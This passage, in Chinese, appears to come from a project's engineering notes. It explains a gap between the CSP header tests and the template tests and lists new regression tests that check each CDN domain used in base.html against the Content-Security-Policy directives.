1. `test_auth.py` 只验证了 CSP 头的存在和基本格式，没有交叉验证 CSP 白名单是否覆盖了 `base.html` 中实际使用的 CDN 域名
2. `test_templates.py` 验证了 `base.html` 包含 CDN 资源引用（`codicon`、`xterm`、`ace`），但没有检查这些域名是否在 CSP 白名单中
3. 两个测试文件各自独立，没有交叉关联——模板测试不知道 CSP 的存在，安全测试不知道模板用了哪些 CDN

#### 8.6.4 新增的回归防护测试

| 测试文件 | 测试类/方法 | 防护目标 |
|---------|------------|---------|
| `test_auth.py` | `test_csp_allows_cdn_resources` | 解析 CSP 指令，验证 `script-src`/`style-src`/`font-src` 都包含 CDN 域名 |
| `test_auth.py` | `test_csp_allows_blob_urls` | 验证 CSP 包含 `blob:`（文件下载/图片预览/web worker） |
| `test_templates.py` | `test_all_cdn_script_domains_in_csp` | 从 `base.html` 提取所有 `<script src="https://...">` 的域名，逐一验证在 CSP `script-src` 中 |
| `test_templates.py` | `test_all_cdn_style_domains_in_csp` | 从 `base.html` 提取所有 `<link stylesheet href="https://...">` 的域名，逐一验证在 CSP `style-src` 中 |

关键设计：`test_templates.py` 中的 `TestCSPvsTemplateConsistency` 类会**动态解析** `base.html` 的实际内容，提取 CDN 域名后与 middleware 返回的 CSP 头交叉验证。这意味着未来如果有人在模板中新增了一个 CDN 依赖但忘记更新 CSP，CI 会自动报错。
